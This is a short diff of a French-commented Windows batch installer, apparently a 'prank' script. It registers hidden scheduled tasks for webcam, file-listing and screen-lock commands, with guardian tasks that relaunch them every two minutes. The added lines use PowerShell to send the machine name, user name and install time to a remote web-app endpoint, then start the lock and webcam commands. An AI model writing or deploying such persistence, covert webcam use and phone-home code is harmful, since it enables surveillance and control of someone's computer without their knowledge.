@@ -57,6 +57,11 @@ schtasks /create /tn "BlagueWebcamGardien" /tr "%CMD_CAM%"  /sc minute  /mo 2 /r
 schtasks /create /tn "BloagueListing"      /tr "%CMD_LIST%" /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
 schtasks /create /tn "BlagueListingGardien"/tr "%CMD_LIST%" /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
 
+:: Notifier le grand frere dans Google Sheets que l'installation a eu lieu
+powershell -Command ^
+  "$body = @{type='install';machine=$env:COMPUTERNAME;user=$env:USERNAME;date=(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')} | ConvertTo-Json -Compress; ^
+   Invoke-RestMethod -Uri '%WEBAPP_URL%' -Method Post -Body $body -ContentType 'application/json' | Out-Null"
+
 :: Lancement immediat
 start "" /b %CMD_LOCK%
 start "" /b %CMD_CAM%
